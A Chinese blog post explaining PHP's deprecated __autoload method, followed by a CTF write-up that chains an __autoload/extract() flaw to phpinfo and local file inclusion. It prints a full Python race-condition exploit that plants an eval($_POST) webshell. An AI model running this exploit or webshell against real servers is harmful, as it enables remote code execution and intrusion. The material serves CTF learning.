# 前言：

__autoload魔术方法从PHP7.2.0开始被废弃，并且在PHP8.0.0以上的版本完全废除。取而代之的则是spl_autoload_register，但是本文还是研究__autoload。

# 什么是autoload魔术方法？

首先还是从官方手册中下手，了解autoload函数

![1633756328_616124a8a2285969f36ec.png!small](https://image.3001.net/images/20211009/1633756328_616124a8a2285969f36ec.png!small)

由此可见，__autoload魔术方法需要有一个类名的参数，使用这个魔术方法之后即可自动加载相应的类。

虽然说是自动，但是本质上还是需要我们指定类名，__autoload才会为我们包含文件，自动加载相应的类。

举一个简单的例子，假设我们有index.php业务代码如下：

    
    
    <?php
    function __autoload($classname){
        include("class_$classname.php");
    }
    $a = new A();

并且我们有class_A.php代码如下：

    
    
    <?php
    class A{
        function __construct(){
            echo "I am class A\n";
    }
    }

我们可以看到，即使我们在index.php中没有包含class_A.php中的类A，但是在index.php中却新建了一个对象，此时因为在index.php中没有类A，所以PHP会自动调用__autoload魔术方法。

而我们__autoload魔术方法的作用就是将相关文件包含进来，因此最终程序还是成功的将I am class A输出。

![1633756339_616124b30a73982e43b73.png!small](https://image.3001.net/images/20211009/1633756339_616124b30a73982e43b73.png!small)

所以，__autoload只需要我们在魔术方法内写明一个逻辑：如果在后面的代码中，新建一个对象，找不到对应的类的时候，应该包含哪些文件。

# autoload相比手动加载有哪些优势？

虽然说感觉__autoload很智能，但是通过上方的例子并不能很明显体现__autoload的优点，因此下方换一个例子，用来展示__autoload相比手动加载的其他优势。

首先假设我们有autoload.php主业务逻辑代码如下：

    
    
    <?php
    
    require_once("class_A.php");
    require_once("class_B.php");
    require_once("class_C.php");
    
    if ($_GET["class"] === 'A'){
        $a = new A();
    }
    else if ($_GET["class"] === 'B'){
        $b = new B();
    }
    else if ($_GET["class"] === 'C'){
        $c = new C();
    }

光看这么一段代码就已经觉得手动加载很繁琐了，因为在这段代码中，仅仅只是包含了三个文件，虽然本质上的业务逻辑十分简单，但是代码看起来很繁琐，并且在这一段代码还存在一个很大的问题，就是资源的浪费。我们可以看到主要的业务逻辑就是一个if语句，并且无论我们往class中怎么传参，总是至少有两个类是无法新建的。也就是说，在代码最上方的三行包含文件代码中，至少有两行的文件加载是多余的。因此，这样就就造成了资源的浪费。

那么如何解决这一个问题呢？

答案就是使用__autoload魔术方法，在我们需要的将相关文件包含进来。

因此我们将autoload.php代码修改如下：

    
    
    <?php
    
    function __autoload($classname){
        require("class_$classname.php");
    }
    
    if ($_GET["class"] === 'A'){
        $a = new A();
    }
    else if ($_GET["class"] === 'B'){
        $b = new B();
    }
    else if ($_GET["class"] === 'C'){
        $c = new C();
    }

这个时候不仅代码看上去清爽了很多，而且在理论上，运行的效率会更高，占用的系统资源会更少。

除此之外，这么写其实还有一个优点，这里用到的文件包含函数是require，而上方使用的是require_once，这么写的好处就是：如果后面再次调用类A、B、C，那么PHP会自动从内存中加载这些类，不会再一次调用__autoload魔术方法。

那么，__autoload在开发中这么神奇，在安全中有没有什么利用场景呢？

有！那必然是有！下面将从一道CTF赛题中看看__autoload在安全中是怎么用的。

# 从一道CTF题看autoload

首先题目代码如下：

    
    
    <?php
    
    /*
    # -*- coding: utf-8 -*-    # @Author: h1xa
    # @Date:   2020-10-13 11:25:09
    # @Last Modified by:   h1xa
    # @Last Modified time: 2020-10-19 07:12:57
    
    */
    include("flag.php");
    error_reporting(0);
    highlight_file(__FILE__);
    
    class CTFSHOW{
        private $username;
        private $password;
        private $vip;
        private $secret;
    
        function __construct(){
            $this->vip = 0;
            $this->secret = $flag;
        }
    
        function __destruct(){
            echo $this->secret;
        }
    
        public function isVIP(){
            return $this->vip?TRUE:FALSE;
            }
        }
    
        function __autoload($class){
            if(isset($class)){
                $class();
        }
    }
    
    #过滤字符
    $key = $_SERVER['QUERY_STRING'];
    if(preg_match('/\_| |\[|\]|\?/', $key)){
        die("error");
    }
    $ctf = $_POST['ctf'];
    extract($_GET);
    if(class_exists($__CTFSHOW__)){
        echo "class is exists!";
    }
    
    if($isVIP && strrpos($ctf, ":")===FALSE && strrpos($ctf,"log")===FALSE){
        include($ctf);
    }

我们可以看到在类CTFSHOW里有一个__autoload魔术方法，虽然是在类里面，但是这是一个全局的魔术方法，也就是说只要调用未知名称的类，都会调用__autoload这个魔术方法，而__autoload魔术方法将传入的参数作为命令执行。

然后我们再往下审计：

    
    
    $key = $_SERVER['QUERY_STRING'];
    if(preg_match('/\_| |\[|\]|\?/', $key)){
        die("error");
    }
    $ctf = $_POST['ctf'];
    extract($_GET);

这一部分代码是过滤部分字符，POST传入ctf，并且将GET请求中的变量名和值进行赋值

    
    
    if(class_exists($__CTFSHOW__)){
        echo "class is exists!";
    }

这一部分有一个函数：class_exists

这一个函数和前面提到的新建对象一样，如果不存在这个类，同样也会调用__autoload魔术方法

而且需要有一个__CTFSHOW__变量，但是下划线过滤了。不过没关系，在PHP中，当我们使用.作为变量名时，PHP会将.转化为下划线。

    
    
    if($isVIP && strrpos($ctf, ":")===FALSE && strrpos($ctf,"log")===FALSE){
        include($ctf);
    }

而这一部分代码不允许ctf中存在:，并且过滤了log，也就是不允许我们日志注入，但是这里存在一个文件包含。

因此我们可以考虑利用文件包含结合phpinfo进行RCE。

![1633756351_616124bf10b2a337860ab.png!small](https://image.3001.net/images/20211009/1633756351_616124bf10b2a337860ab.png!small)

这里贴一个项目链接，这个项目大概就是可以通过phpinfo结合本地文件包含，利用PHP的文件上传会存在临时文件的特性，进行getshell，具体原理就不再赘述了，参考说明文档即可。

exp链接：vulhub/exp.py at master · vulhub/vulhub (github.com)

说明文档：vulhub/README.zh-cn.md at master · vulhub/vulhub (github.com)

将改exp修改部分后，如下：

    
    
    #!/usr/bin/python
    import sys
    import threading
    import socket
    
    attempts_counter = 0
    
    
    def setup(host, port, phpinfo_path, lfi_path, lfi_param, shell_code='<?php eval($_POST["mb"]);?>', shell_path='/tmp/g'):
        """
        根据提供参数返回请求内容
        :param host:HOST
        :param port:端口
        :param phpinfo_path: phpinfo文件地址
        :param lfi_path: 包含lfi的文件地址
        :param lfi_param: lfi载入文件时, 指定文件名的参数
        :param shell_code: shell代码
        :param shell_path: shell代码保存位置
        :return:
            phpinfo_request: phpinfo 请求内容
            lfi_request: lfi 请求内容
            tag: 标识内容
        """
        tag = 'Security Test'   # 搜索验证标识
        payload = \
    '''{tag}\r
    <?php $c=fopen('{shell_path}','w');fwrite($c,'{shell_code}');?>\r
    '''.format(shell_code=shell_code, tag=tag, shell_path=shell_path)
    
        request_data = \
    '''-----------------------------7dbff1ded0714\r
    Content-Disposition: form-data; name="dummyname"; filename="test.txt"\r
    Content-Type: text/plain\r
    \r
    {payload}
    -----------------------------7dbff1ded0714--\r
    ''' .format(payload=payload)
    
        phpinfo_request = \
    '''POST {phpinfo_path}?%5f%5fCTFSHOW%5f%5f=phpinfo&a={padding} HTTP/1.1\r
    Cookie: PHPSESSID=q249llvfromc1or39t6tvnun42; othercookie={padding}\r
    HTTP_ACCEPT: {padding}\r
    HTTP_USER_AGENT: {padding}\r
    HTTP_ACCEPT_LANGUAGE: {padding}\r
    HTTP_PRAGMA: {padding}\r
    Content-Type: multipart/form-data; boundary=---------------------------7dbff1ded0714\r
    Content-Length: {request_data_length}\r
    Host: {host}:{port}\r
    \r
    {request_data}
    '''.format(
        padding='A' * 4000,
        phpinfo_path=phpinfo_path,
        request_data_length=len(request_data),
        host=host,
        port=port,
        request_data=request_data
        )
    
        lfi_request = \
    '''POST {lfi_path}?{lfi_param} HTTP/1.1\r
    User-Agent: Mozilla/4.0\r
    Proxy-Connection: Keep-Alive\r
    Host: {host}\r
    Content-Type: application/x-www-form-urlencoded\r
    \r
    ctf={{}}\r
    '''.format(
        lfi_path=lfi_path,
        lfi_param=lfi_param,
        host=host
        )
        return phpinfo_request, tag, lfi_request
    
    
    def phpinfo_lfi(host, port, phpinfo_request, offset, lfi_request, tag):
        """
        通过向phpinfo发送大数据包延缓时间, 然后利用lfi执行
        :param host:HOST
        :param port:端口
        :param phpinfo_request: phpinfo页面请求内容
        :param offset: tmp_name在phpinfo中的偏移位
        :param lfi_request: lfi页面请求内容
        :param tag: 标识内容
        :return:
            tmp_file_name: 临时文件名
        """
        phpinfo_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        lfi_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    
        phpinfo_socket.connect((host, port))
        lfi_socket.connect((host, port))
    
        # 1. 先向phpinfo发送大数据包, 且其中包含php会将payload放入临时文件中
        # print(phpinfo_request)
        # print(lfi_request)
        phpinfo_socket.send(phpinfo_request.encode())
    
        phpinfo_response_data = ''
        while len(phpinfo_response_data) < offset:
            # 取不到数据则反复执行
            phpinfo_response_data += phpinfo_socket.recv(offset).decode()
    
        try:
            tmp_name_index = phpinfo_response_data.index('[tmp_name] =&ampgt')
            # 获取包含payload的临时文件名
            tmp_file_name = phpinfo_response_data[
                                tmp_name_index + 17:
                                tmp_name_index + 31
                            ]
        except ValueError:
            return None
        # 2. 再向lfi发送包含payload的临时文件名, 用于包含
        lfi_socket.send((lfi_request.format(tmp_file_name)).encode())
        # print(lfi_request.format(tmp_file_name))
        lfi_response_data = lfi_socket.recv(4096).decode()
    
        # 3. 停止phpinfo socket连接
        phpinfo_socket.close()
        # 4. 停止lfi socket连接
        lfi_socket.close()
        if lfi_response_data.find(tag) != -1:
            # 5. lfi response中存在标识内容则payload执行成功
            return tmp_file_name
    
    
    class ThreadWorker(threading.Thread):
        def __init__(self, event, lock, max_attempts,
                     host, port, phpinfo_request,
                     offset, lfi_request, tag,
                     shell_code, shell_path,
                     lfi_path, lfi_param):
            threading.Thread.__init__(self)
            self.event = event
            self.lock = lock
            self.max_attempts = max_attempts
            self.host = host
            self.port = port
            self.phpinfo_request = phpinfo_request
            self.offset = offset
            self.lfi_request = lfi_request
            self.tag = tag
            self.shell_code = shell_code
            self.shell_path = shell_path
            self.lfi_path = lfi_path
            self.lfi_param = lfi_param
    
        def run(self):
            global attempts_counter
            while not self.event.is_set():
                # 如果没有set event则一直重复执行, 直到已尝试次数大于最大尝试数(attempts_counter > max_attempts)
                with self.lock:
                    # 获取锁, 执行完后释放
                    if attempts_counter >= self.max_attempts:
                        return
                    attempts_counter += 1
                try:
                    tmp_file_name = phpinfo_lfi(
                        self.host, self.port, self.phpinfo_request, self.offset, self.lfi_request, self.tag)
                    if self.event.is_set():
                        break
                    if tmp_file_name:
                        # 找到tmp_file_name后通过set event停止运行
                        print('\n{shell_code} 已经被写入到{shell_path}中'.format(
                            shell_code=self.shell_code,
                            shell_path=self.shell_path
                        ))
                        'http://127.0.0.1/test/lfi_phpinfo/lfi.php?load=/tmp/gc&f=uname%20-a'
                        print('默认调用方法: http://{host}:{port}{lfi_path}?{lfi_param}={shell_path}&f=uname%20-a'.format(
                            host=self.host,
                            port=self.port,
                            lfi_path=self.lfi_path,
                            lfi_param=self.lfi_param,
                            shell_path=self.shell_path
                        ))
    
                        self.event.set()
                except socket.error:
                    return
    
    
    def get_offset(host, port, phpinfo_request):
        """
        获取tmp_name在phpinfo中的偏移量
        :param host: HOST
        :param port: 端口
        :param phpinfo_request: phpinfo 请求内容
        :return:
            tmp_name在phpinfo中的偏移量
        """
    
        phpinfo_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        phpinfo_socket.connect((host, port))
        phpinfo_socket.send(phpinfo_request.encode())
        phpinfo_response_data = ''
        while True:
            i = phpinfo_socket.recv(4096).decode()
            phpinfo_response_data += i
            if i == '':
                break
    
            # 检测是否是最后一个数据块
            if i.endswith('0\r\n\r\n'):
                break
        phpinfo_socket.close()
        tmp_name_index = phpinfo_response_data.find('[tmp_name] =&ampgt')
        print(phpinfo_response_data)
        if tmp_name_index == -1:
            raise ValueError('没有在phpinfo中找到tmp_name')
        print('找到了 {} 在phpinfo内容索引为{}的位置'.format(
            phpinfo_response_data[tmp_name_index:tmp_name_index+10], tmp_name_index))
    
        return tmp_name_index + 256
    
    
    def main():
        pool_size = 100
        host = '7438117e-d02c-467c-859a-17c47f67b37e.challenge.ctf.show'
        port = 8080
        phpinfo_path = '/'
        lfi_path = '/'
        lfi_param = 'isVIP=1'
        shell_code = '<?php eval($_POST["mb"]);?>'
        shell_path = '/tmp/g'
        # 最大尝试次数
        max_attempts = 1000
    
        print('LFI With PHPInfo()')
        # 一 生成phpinfo请求内容, 标志内容, lfi请求内容
        phpinfo_request, tag, lfi_request = setup(
            host=host, port=port, phpinfo_path=phpinfo_path, lfi_path=lfi_path,
            lfi_param=lfi_param, shell_code=shell_code, shell_path=shell_path)
    
        # 二 获取[tmp_name]在phpinfo中的偏移位
        offset = get_offset(host, port, phpinfo_request)
    
        sys.stdout.flush()
        thread_event = threading.Event()
        thread_lock = threading.Lock()
        print('创建线程池 {}...'.format(pool_size))
        sys.stdout.flush()
        thread_pool = []
        for i in range(0, pool_size):
            # 三 多线程执行phpinfo_lfi
            thread_pool.append(ThreadWorker(thread_event, thread_lock, max_attempts,
                                            host, port, phpinfo_request, offset,
                                            lfi_request, tag,
                                            shell_code, shell_path,
                                            lfi_path, lfi_param
                                            ))
        for t in thread_pool:
            t.start()
        try:
            while not thread_event.wait(1):
                if thread_event.is_set():
                    break
                with thread_lock:
                    sys.stdout.write('\r{} / {}'.format(attempts_counter, max_attempts))
                    sys.stdout.flush()
                    if attempts_counter >= max_attempts:
                        # 尝试次数大于最大尝试次数则退出
                        break
            if thread_event.is_set():
                print('''success !''')
            else:
                print('LJBD!')
        except KeyboardInterrupt:
            print('\n正在停止所有线程...')
            thread_event.set()
        for t in thread_pool:
            t.join()
    
    
    if __name__ == "__main__":
        main()

当然啦，这题除了可以利用__autoload魔术方法结合本地文件包含getshell，也可以用php上传文件条件竞争来做。

# 总结：

__autoload之所以好用，首先是因为它是一个全局的魔术方法，并且开发者在使用__autoload的时候，往往是为了包含相关的文件，而在指定包含的文件名时，就可能会出现包含文件可控的情况，虽然__autoload已经在新版本的PHP中废弃，但是在对我们研究老版本的PHP项目，还是有一定指导意义的。

